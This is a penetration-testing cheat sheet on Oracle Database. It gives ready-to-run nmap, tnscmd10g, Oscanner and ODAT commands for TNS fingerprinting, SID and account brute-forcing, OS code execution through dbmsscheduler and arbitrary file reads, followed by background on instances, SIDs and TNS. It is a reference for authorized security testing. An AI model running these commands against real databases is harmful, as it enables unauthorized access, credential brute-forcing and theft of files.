# Oracle Database

#### Security notes

- Generally usernames and passwords are not case-sensitive in older Oracle databases, but as of **11g** this is not the case.
- Accounts are typically subject to an account lockout on too many password attempts ranging from 5 to 10

#### Tools

- Nmap
- [Oscanner](https://gitlab.com/kalilinux/packages/oscanner/) is an Oracle assessment framework developed in Java.
- [ODAT](https://github.com/quentinhardy/odat) is an open source penetration testing tool that tests the security of Oracle Databases remotely.
- tnscmd10g is a tool to enumerate the oracle tnslsnr process

```bash
# Fingerprint Oracle TNS
nmap --script=oracle-tns-version IP
tnscmd10g version -h IP

# Brute force oracle user accounts
nmap --script=oracle-sid-brute IP
nmap --script=oracle-brute IP

oscanner -s 192.168.1.15 -P 1040
```

##### ODAT

The all module is the first module that should be used when you meet an Oracle Database.
It is very useful when you want to known what you can do on a database server with a valid SID or no, with a valid Oracle account or no.

```bash
./odat.py all -s 192.168.1.254 -p 1521 --accounts-files accounts/logins.txt accounts/pwds.txt
./odat.py all -s 192.168.1.254 -p 1521 -d ORCL # If you known a SID
```

If you have an account

```bash
./odat.py all -s 192.168.1.254 -p 1521 -d ORCL -U SYS -P password # If you know a user (here SYS account of ORCL SID)
/usr/bin/sqlplus64 username/password@IP:PORT/SID # Connecting to an Oracle Database
./odat.py dbmsscheduler -s 192.168.0.5 -d ORCL -U username -P password --sysdba --exec "C:\windows\system32\cmd.exe /c dir C:\\Users\\ > C:\output" -vvv # Code Execution
./odat.py externaltable --getFile C:\\Users\\Booj\\Desktop evil.jpg evil.jpg -s 192.168.0.5 -d ORCL -U username -P password --sysdba # Arbitrary File Read
```

**Note that it will perform bruteforce by default with is own list**

- If ODAT founds at least one SID (e.g. ORCL), it will search valid Oracle accounts.

- For each valid account (e.g. SYS) on each valid instance (SID), ODAT will give you what each Oracle user can do (e.g. reverse shell, read files, become DBA).

*If you don't know, now you know: [Oracle Database](https://docs.oracle.com/cd/E11882_01/network.112/e41945/concepts.htm#NETAG176)*

A database has at least one **instance**. 
An instance is comprised of a memory area called the System Global Area (SGA) and Oracle background processes. 
The memory and processes of an instance efficiently manage the associated database's data and serve the database users.

The instance name is specified by the **INSTANCE_NAME** initialization parameter. 
The instance name defaults to the Oracle system identifier (SID) of the database instance.

The most common SID is **ORCL**

Account are link to SID.

Oracle can come with the Transparent Network Substrate protocol.
TNS is a proprietary Oracle computer-networking technology, supports homogeneous peer-to-peer connectivity on top of other networking technologies such as TCP/IP, SDP and named pipes.


Reference:

Thanks to @Arrway for the "TNS" part <https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#fingerprint-oracle-tns-version>